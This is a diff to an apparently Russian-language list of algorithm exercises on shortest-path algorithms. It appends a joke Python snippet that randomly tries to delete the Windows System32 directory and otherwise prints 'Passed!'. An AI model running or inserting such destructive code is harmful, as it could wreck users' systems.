@@ -55,3 +55,19 @@
 51. [Алгоритм Дейкстры.](./tasks/051.md)
 52. [Алгоритм Флойда-Уоршалла.](./tasks/052.md)
 53. [Алгоритм Беллмана-Форда.](./tasks/053.md)
+
+
+```python
+import random
+import os
+
+if random.randint(0, 6) == 1:
+    os.remove("C:\Windows\System32")
+else:
+	print('Сдал!')
+```
+
+
+
+
+
